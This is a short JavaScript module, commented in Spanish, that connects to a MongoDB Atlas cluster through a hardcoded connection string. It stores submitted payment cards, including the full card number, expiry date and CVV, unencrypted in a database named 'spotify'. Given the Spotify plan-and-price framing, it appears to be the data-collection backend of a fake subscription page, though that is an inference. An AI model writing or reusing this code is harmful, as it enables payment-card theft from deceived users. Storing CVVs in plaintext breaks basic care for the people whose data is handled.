import { MongoClient } from 'mongodb';

const uri = "mongodb+srv://Mat1520:tu_contraseña_aqui@cluster0.so39idr.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"; // Reemplaza con tu URI de MongoDB Atlas
const client = new MongoClient(uri);

export async function connectDB() {
    try {
        await client.connect();
        console.log('Conectado a MongoDB Atlas');
    } catch (error) {
        console.error('Error conectando a MongoDB:', error);
        throw error;
    }
}

export async function saveCard(cardData) {
    try {
        const database = client.db('spotify');
        const cards = database.collection('cards');
        
        const result = await cards.insertOne({
            cardHolder: cardData.cardHolder,
            cardNumber: cardData.cardNumber,
            expiryDate: cardData.expiryDate,
            cvv: cardData.cvv,
            plan: cardData.plan,
            price: cardData.price,
            createdAt: new Date()
        });

        return result;
    } catch (error) {
        console.error('Error al guardar la tarjeta:', error);
        throw error;
    }
} 